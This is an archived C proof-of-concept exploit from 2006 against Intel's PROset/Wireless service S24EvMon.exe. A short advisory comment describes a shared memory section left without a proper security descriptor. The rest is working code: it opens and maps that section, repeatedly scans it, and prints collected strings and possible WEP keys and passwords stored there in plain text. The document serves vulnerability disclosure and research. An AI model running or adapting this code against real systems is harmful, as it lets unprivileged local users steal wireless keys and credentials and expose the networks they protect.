<html><head><title>Intel Wireless Service (s24evmon.exe) Shared Memory Exploit</title></head><pre>///////////////////////////////////////////////////////////////////////
////  S24EvMon.exe Intel Wireless Management Service KEY Hunter
////  Rubén Santamarta
////  ruben@reversemode.com
////  www.reversemode.com
////  28/04/2006
///////////////////////////////////////////////////////////////////////

/**********************************************************************************************************
 * Testing a vuln-finder application that I am developing, I found a flaw within S24EvMon.exe. 
 * It is a service which is part (at least) of the Intel PROset/Wireless software. This application 
 * is provided by Intel in order to support intel Wireless Devices based on Spectrum 24 chipsets.
 *
 * This service uses a shared memory section which is created without the proper security descriptor, 
 * allowing unprivileged users to perform operations like Delete, Read or Write into the memory. The 
 * section is named S24EventManagerSharedMemory
 * 
 * This shared memory is used to store ,in plain text, confidential information like WEP Key, Passwords...
 *
 * The successful exploitation of this vulnerability could allow to any unprivileged user to access 
 * confidential information,exposing the network. An important mitigating factor is that the 
 * vulnerability is local, nevertheless some Malware could take advantage of this flaw. 
 **********************************************************************************************************/

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#define InitializeObjectAttributes( p, n, a, r, s ) {	\
     (p)-&gt;Length = sizeof( OBJECT_ATTRIBUTES );         \
     (p)-&gt;RootDirectory = r;                            \
     (p)-&gt;Attributes = a;                               \
     (p)-&gt;ObjectName = n;                               \
     (p)-&gt;SecurityDescriptor = s;                       \
     (p)-&gt;SecurityQualityOfService = NULL;              \
     }

#define InitializeUnicodeStr(p,s) {			\
     (p)-&gt;Length= wcslen(s)*2;				\
     (p)-&gt;MaximumLength = wcslen(s)*2+2;		\
     (p)-&gt;Buffer = s;					\
     }


typedef struct _SECTION_BASIC_INFORMATION {
  ULONG                   d000;
  ULONG                   SectionAttributes;
  LARGE_INTEGER           SectionSize;
} SECTION_BASIC_INFORMATION;

typedef struct _LSA_UNICODE_STRING {  
    USHORT Length;  
    USHORT MaximumLength; 
    PWSTR Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING *ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        
    PVOID SecurityQualityOfService;  
} OBJECT_ATTRIBUTES;



typedef DWORD (WINAPI* PQUERYSECTION)(HANDLE, DWORD, PVOID,DWORD,DWORD*);

typedef DWORD (WINAPI* POPENSECTION)(HANDLE*, DWORD,OBJECT_ATTRIBUTES* );


VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &amp;lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,&quot;Error&quot;,0);
 exit(1);
}



int main(int argc, char* argv[])
{
 OBJECT_ATTRIBUTES SectionAttributes;
 SECTION_BASIC_INFORMATION buff;
 PQUERYSECTION NtQuerySection;
 POPENSECTION NtOpenSection;
 char * sMap,cString[256];
 UNICODE_STRING uStr;
 LPVOID lpMapAddress;
 DWORD i,b=0,c=0;
 HANDLE hSection;


NtOpenSection = (POPENSECTION) GetProcAddress( LoadLibrary( &quot;ntdll.dll&quot; ),
						   &quot;NtOpenSection&quot; );

NtQuerySection = (PQUERYSECTION) GetProcAddress( LoadLibrary( &quot;ntdll.dll&quot;),
						 &quot;NtQuerySection&quot; );

InitializeUnicodeStr(&amp;uStr,L&quot;\\BaseNamedObjects\\S24EventManagerSharedMemory&quot;);
InitializeObjectAttributes(&amp;SectionAttributes, &amp;uStr,NULL, NULL, NULL );	


NtOpenSection( &amp;hSection, SECTION_MAP_READ|SECTION_QUERY,  &amp;SectionAttributes );
 
if (hSection == NULL) ShowError();
printf(&quot;Section opened successfully.\n&quot;); 
 

lpMapAddress = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
if (lpMapAddress == NULL) ShowError();
 
if (NtQuerySection(hSection,0,&amp;buff,sizeof(buff),0)) ShowError();

sMap= ( char* )lpMapAddress;
printf(&quot;Scanning section...\n\n&quot;); 

while(c&lt;100)
{
 
 c++;
 printf(&quot;\nSNAPSHOT ID[%d]----------------[BEGIN]\n\n&quot;,c);
		
 for (i=0; i&lt; buff.SectionSize.QuadPart; i++)
	{
	
		if( sMap[i]&gt; 0x29  )
		{
			while( sMap[i] != 0x0 )
			{
				if( sMap[i]&gt;=0x30 )
				{
					cString[b] = sMap[i];
					b++;
				}									
				i++;
			}
			
			cString[b++]='\0';
			// less 3 characters should be GARBAGE
			if( b&gt;3 &amp;&amp; b!=14 &amp;&amp; b!=27 ) 	printf(&quot; String collected: %s\n&quot;,cString);
			// Alphanumeric WEP KEY (13 characters)
			if( b==14 )	printf(&quot;### Possible Alphanumeric WEP KEY found: %s\n&quot;,cString);
			if( b==27 ) 
			{
                   		if(cString[0]!=0x30 &amp;&amp; cString[2]!=0x30 &amp;&amp; cString[6]!=0x30)
                       			printf(&quot;### Possible WEP KEY found(Ascii/HexMode): %s\n&quot;,cString);
                                else
                        		printf(&quot; String collected: %s\n&quot;,cString);
                	}   
                	b=0;		
		}
			
	}
printf(&quot;\nSNAPSHOT ID[%d]----------------[END]\n&quot;,c);   

Sleep(1000);
}

CloseHandle(hSection);

return 0;
}

// milw0rm.com [2006-05-09]</pre></html>